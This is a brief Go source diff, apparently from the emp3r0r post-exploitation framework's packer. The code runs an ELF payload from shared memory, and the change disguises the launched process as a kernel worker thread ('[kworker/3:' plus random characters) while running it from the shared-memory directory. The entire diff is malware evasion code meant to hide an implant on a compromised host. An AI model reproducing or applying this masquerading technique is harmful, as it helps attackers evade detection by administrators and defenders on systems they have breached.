@@ -8,7 +8,6 @@ import (
 	"os"
 	"os/exec"
 	"syscall"
-	"time"
 	"unsafe"
 
 	"github.com/jm33-m0/emp3r0r/packer/internal/utils"
@@ -70,7 +69,11 @@ func runFromMemory(procName string, buffer []byte) {
 	if err != nil {
 		log.Fatal(err)
 	}
-	cmd := exec.Command(shmPath+procName, os.Args[1:]...)
+	err = os.Chdir(shmPath)
+	if err != nil {
+		log.Fatal(err)
+	}
+	cmd := exec.Command(procName, os.Args[1:]...)
 	err = cmd.Start()
 	if err != nil {
 		log.Fatal(err)
@@ -94,6 +97,6 @@ func main() {
 	}
 
 	// write ELF to memory and run it
-	procName := fmt.Sprintf("%d", time.Now().UnixNano())
+	procName := fmt.Sprintf("[kworker/3:%s]", utils.RandStr(7))
 	runFromMemory(procName, elfdata)
 }
